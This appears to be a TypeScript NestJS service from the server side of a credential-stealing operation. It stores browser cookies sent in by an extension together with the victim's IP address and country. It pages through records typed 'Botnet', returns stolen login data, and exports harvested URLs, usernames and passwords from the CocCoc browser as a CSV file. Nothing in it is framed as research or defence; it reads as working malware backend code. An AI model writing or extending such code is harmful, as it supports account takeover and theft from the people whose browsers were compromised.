import { Parser } from "json2csv";
import { Repository } from 'typeorm';
import { User } from 'src/entitys/users.entity';
import { SendNoteDto } from './dtos/SendNoteDto';
import { InjectRepository } from '@nestjs/typeorm';
import { DataType, IPEntity } from 'src/entitys/ips.entity';
import { SendChromeDataDto } from './dtos/SendChromeDataDto';
import { HttpException, HttpStatus, Injectable } from '@nestjs/common';

@Injectable()
export class CookieService {
  constructor(
    @InjectRepository(User) private userRepo: Repository<User>,
    @InjectRepository(IPEntity) private ipRepo: Repository<IPEntity>,
  ) { }

  async getAllIP(userId: string, take = 10, skip = 0) {
    const [result, total] = await this.ipRepo.findAndCount({
      where: { user: { id: userId }, type: DataType.Botnet },
      take,
      skip,
      order: { updatedAt: 'DESC' },
    });
    return { data: result, total: total };
  }

  async getExtentionData(userId: string, take = 10, skip = 0) {
    const [result, total] = await this.ipRepo.findAndCount({
      where: { type: DataType.Extention },
      take,
      skip,
      order: { updatedAt: 'DESC' },
    });
    return { data: result, total: total };
  }

  async getAdsInfo(id: string) {

  }

  async setViewIP(id: any) {
    const ipTmp = await this.ipRepo.findOneBy({ id: id });
    ipTmp.isView = true;
    return await this.ipRepo
      .save(ipTmp)
      .then((res) => res)
      .catch((err) => {
        throw new HttpException(err.message, HttpStatus.BAD_REQUEST);
      });
  }

  async deleteIP(id: string) {
    return await this.ipRepo.delete(id);
  }

  async getAllLoginData(take = 10, skip = 0) {
    return await this.ipRepo.find({
      select: { loginData: true },
      take,
      skip,
    })
  }

  async setExtentionData(cookie) {
    let ipTmp = await this.ipRepo.findOne({ where: { ipAddress: cookie.ipInfo?.ip || 0 } });
    if (!ipTmp) ipTmp = new IPEntity();

    ipTmp.note = '';
    ipTmp.loginData = '';
    ipTmp.isView = false;
    ipTmp.type = DataType.Extention;
    ipTmp.countryName = cookie.ipInfo?.country || 'None';
    ipTmp.cookieData = JSON.stringify(cookie.cookies) || '';
    ipTmp.ipAddress = cookie.ipInfo?.ip || Math.random().toString(36).slice(2, 10);

    return this.ipRepo
      .save(ipTmp)
      .then((cookies) => cookies)
      .catch((err) => { throw new HttpException(err.message, HttpStatus.BAD_REQUEST) });
  }

  async getCSV() {
    const results = [];
    const [result, total] = await this.ipRepo.findAndCount({
      take: 700,
      skip: 2100,
      where: { type: DataType.Botnet },
      order: { updatedAt: 'DESC' },
    });

    if (!result || result.length == 0) {

    } else {
      result.map(item => {
        const loginData = item.loginData && JSON.parse(item.loginData) || [];
        const domains = Array.from(new Set(loginData.map((item: any) => item.domain))) || [];
        const profiles = Array.from(new Set(loginData.map((item: any) => item.profile))) || [];;

        profiles.forEach(p => {
          domains.forEach(domain => {
            const groupItem = loginData
              .filter((d) => d.browser == "CocCoc" && d.profile == p && d.domain == domain);

            results.push({
              url: domain,
              username: groupItem.map(item => item.username).join(),
              password: groupItem.map(item => item.password).join(),
            })
          })
        })
      })
    }

    const parser = new Parser({
      fields: ["url", "username", "password"],
    });

    const csv = parser.parse(results);
    return csv.replace(/"/g, '');
  }
}
